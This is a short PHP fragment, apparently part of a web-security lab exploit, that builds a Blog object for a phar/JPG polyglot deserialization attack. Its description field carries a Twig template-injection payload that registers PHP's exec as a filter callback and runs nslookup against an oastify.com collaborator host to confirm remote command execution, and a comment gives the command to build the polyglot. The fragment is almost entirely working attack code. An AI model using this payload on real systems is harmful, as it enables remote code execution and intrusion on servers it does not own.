...
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("nslookup 6ipgpx8n430hiho2efhron5llcr3ft3i.oastify.com")}}';
$blog->user = 'user';
...
// Run php -d phar.readonly=0 phar_jpg_polyglot.php
